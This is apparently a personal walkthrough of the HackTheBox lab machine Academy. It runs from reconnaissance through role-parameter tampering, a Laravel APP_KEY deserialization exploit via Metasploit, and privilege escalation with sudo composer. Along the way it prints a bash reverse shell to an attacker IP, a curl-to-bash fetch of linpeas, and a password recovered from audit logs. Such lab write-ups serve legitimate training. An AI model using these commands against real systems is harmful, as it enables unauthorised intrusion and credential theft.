## Notes for the HachTheBox machine, Academy.
---------------------------------------------

### Academy.
------------
1. We start as always be nmap, we run it with sudo, cause nmap likes it, add `-v` also to see also ports as we go:
    - `sudo nmap -v -sC -sV -oA nmap/academy 10.10.10.215` 
    we do also allports version, just so if we need it along the way:
    - `sudo nmap -p- -v -sC -sV -oA nmap/academy-allports 10.10.10.215` 

2. While namp if finishing up, in the browser we go to the tcp port of 80, namely: `10.10.10.215:80`, we
    see that it's getting redirected to `academy.htb` and failing to load.

3. We get the header of the ip with `curl`:
    - `curl -v 10.10.10.215`
    we see that we make a GET http request, we get 302, which is a redirection.
    also we see that it's an Apache server, and the location is `http://academy.htb`,
    so we add it to our local `/etc/hosts/` file.

4. After adding the ip to hosts file, we try several files, e.g. `http://academy.htb/robot.txt`, `index.html`, `index.php`.
    and we find that the php one works, with some links to register and login, so the website is a php one. 

5. We do some enumeration on the different urls which may exists with `gobuster`:
    - `gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -x php -u http://academy.htb -o gobuster/dir-root.log`
        note that `-x` is for extension and `-u` is for url, and `-w` is for wordlist.
    now we do another gobuster, this time for vhost:
    -  `gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://academy.htb -o gobuster/vhost-sub.txt`

6. While these reckons are running we try the `login` function and try out some default user and password, nothing works, so we send this to 
    burpsuit. We intercept the login request, try to inject the password manually with usuall characters, nothin works. Then we try the `sqlmap` 
    to see if any SQL injection would work. We copy the request from burpsuit to a file, then:
    - `sqlmap -r requests/login.req --batch` 
    all tests fail!
    we also try a higher level with higher risk:
    - `sqlmap -r requests/login.req --batch --level 5 --risk 3`

7. nmap found another port, 33060, which says it's a mysql database port. We try to see if we can login to the database:
    - `mysql -u root -p -h 10.10.10.215:33060`
    we don't enter the password. But we get a Unknown MySQL server host. Probably it's not a mysql port!
    we can netcat the local mysql server to compare it with this one:
    - `nc localhost 3306` 
    we see that it gives a MariaDB thing. which if we `nc` the remote one, it gives nothing.
    we take another root...

8. We take a look at the register functionality, we register a user, login, and take a look around. It's seems all static, javascript content. 
    We don't seem to make requests when we click on some funcitonalities inside tha academy. The username seems to be hardcoded. 

9. We take a look to the `gobuster` directory  listings. We see bunch of endpoints that don't return 403 not found:
    - `cat root-dirs.txt | grep -v 403`
    we see two interesting points: `config.php` and `admin.php`. `academy.htb/config.php` is a blank page, which is typical of php configs, we take
    a look to the source of the page also, to see if there any comments or something, there is nothing.

10. We register an admin user with a space at the end, to see if we can confuse the register function. We also intercept the registration. 
    We see that in the request we also have a hidden `roleid` parameter.

11. There is an interesting volunerability that we can register users with admin and a spaces after it, this is in iteself intersting, because 
    we can for example, appear in message boards with a username admin but space at the end won't be displayed. Here but the username is hardcoded.

12. Now we register a a user, but we intercept it and change the `roleid` parameter from 0 to 1. Now we test it in `admin.php` and voilla we get 
    a deck of status. We see one intersting message that there is a pending fixing on `dev-staging-01.academy.htb`, we add this to our hosts file,
    and we check it.

13. `dev-staging-01.academy.htb` is a Laravel error page. By looking around we see bunch of variables set, including database username and password,
    app-key and etc. We use the `searchsploit` to see if we have anything working for Larvavel:
    - `searchsploit laravel`
    we have an intersting one with `metasploit`, we fire up the metasploit and use it and set the required variables with these envs:
    - `sudo msfdb run`
    - `search laravel`
    - `use 0`
    - `show options`
    - `set APP_KEY ...`
    - `set Proxies http:127.0.0.1:8080`
    - `set RHOST dev-staging-01.academy.htb`
    - `set VHOST dev-staging-01.academy.htb`
    - `set LHOST tun0`
    - `set LPORT 9001`
    - `run`
and voilla we get a shell!
    
14. The way we `metasploit` does it, is not a magic, if we look at the Burp Suits, the requst sent has a cross site request forgery tocken, so if 
    we take a look at:
    - `echo -n <token> | base64 -d`
     we get a key-value dictionary, we use `sed` to replace commas with a new line:
    - `echo -n <token> | base64 -d | sed 's/,/\r\n/g'`
    we get `iv`, `mac` and a `value` key. 


15. If we take a look to the value token, and decrypt it using `base64 -d` and pass it to `entropy`:
    - `echo -n <token> | base64 -d | ent`
    we get: Entropy = 7.467030 bits per byte.
    if it was completely random we would get 8 bits per byte, for a normal ASCII file, the entropy is 
    usuall around 4.5 

16. As the token is sent to the ip address, and nothin else, the token probably is encrypted with the app key.
    we look around in web and see that Laravel makes use of AES-256-CBC cipher. We use an online tool (cyberchef) to decrypt 
    it to a readable text. We can see that it's doing a php deserialization. Probably the exploit is a deserialization volunerability.


17. We use python to get a regular bash shell:
    - `python3 -c 'import pty;pty.spawn("/bin/bash")'`

18. We try to login to mysql database with the information we got from the error page of Laravel:
    - `mysql -u homestead -D homestead -p -H localhost`
    it's being denied!


15. We successfully get a reverse shell! Now we get a nice bash, as we don't know we can get a clean terminal with metasploit we run a 
    standard reverse shell inside the metasploit given prompt over the machine:
    in another teminal:
    - `nc -lvnp 9001`
    then inside the metasploit given shell:
    - `bash -c 'bash -i >& /dev/tcp/10.10.16.6/9001 0>&1'`
    we get the shell with netcat, now inside it we do, just remeber before the netcat command exectuion in this terminal we must be on a standard 
    bash shell as opposed to default zsh terminal of kali, so before running netcat, we do: `exec bash --login`,
    note that there shouldn't be a slash after `/bin/bash` -> Of course (bash is an executable!),
    - `python3 -c 'import pty;pty.spawn("/bin/bash")'`
    now we do `CTRL+z` to exit this temrinal, then we do:
    - `stty raw -echo`
    then we bring netcat to forward:
    - `fg`
    note that it may not output the command, but it's there, so just type `fg`, and then we have our nice shell with arrow and TAB functionality,
    we can also do, `export TERM=xterm` to get the `clean` command.
    note that if the cursor is doing weird stuff, like going over some text, probably the size of stty is not correct, in another terminal do,
    - `stty -a`
    get the row and column size and then inside the reverse shell, do:
    - `stty rows <row-number> cols <column-number>`

16. As we are not successful in login to the databse, we do a grep for the password in the config directory of the `dev-staging-01` home. 
    we see that it's pulling username and password from the environment variables.
    if we cat the `.env` file we see bunch of vars, but the username and the password are the same as before.

17. We take a look also to the `academy` homepage, and cat the `.env` file and try to login to the database with that username and password.
    it's also denied! We check if the database is running by taking a look to the ports:
    - `ss -lntp`
    3306 is there but there is also 33060 which is not clear what it is.

18. Let's see if we can ssh with the password we got from `.env` file inside the `academy` direcotry, we save the passwod to `pw` file,
    then we look the users in home `/home`, see if there is something writable (which means we have access to):
    - `find /home -writable -type f 2>/dev/null`
    we get nothig, we do ls with find:
    - `find /home -ls -type f 2>/dev/null`
    we see that `.bash_history` is directed to `/dev/null`, we get users from `/etc/passwd` that have a login shell of `sh` or `bash`:
    - `grep sh /etc/passwd | awk -F : '{print $1}'`
    we save these users to a `users` file.

19. We use `CrackMapExec` to see if ssh works with any of these users:
    - `crackmapexec ssh academy.htb -u users -p pw`
    one user works, we ssh into the machine!

20. We take a look around the logs, blah blah, we come across the `audit` directory, which contains audit logs, which are XML-based files that 
    contain the specific configuration, file permissions, and access control tests to be performed. 
    We take a report of these with `auditreport`:
    - `aureport`
    we take a look to `tty`'s also, with:
    - `aureport --tty`
    we see a user `mrb3n` and a thing that looks a password that probably got pasted by mistake, `mrb3n_Ac@d3my!`.

21. We login with `mrb3n` user and run the  `linpeas.sh` script over curl:
    - `su mrb3n`
    - `curl 10.10.16.6:8000/linpeas.sh | bash`

22. To save time we ssh into the machine with mrb3n user and take a look to the files owned by this user:
    - `ssh mrb3n@10.10.10.215`
    - `find / -user mrb3n 2>/dev/null | grep -v 'proc\|run\|sys'`
    we don't want to see the files regarding the `proc` or `run` or `sys`.

23. We see a composer cache file, we do a  `sudo -l` with the found password, we see that we can run the `composer` with sudo privileges. 
    We go over `gtfobins` and find a script for a script related to composer that gives a sudo shell. We just run it and voilla, root!!

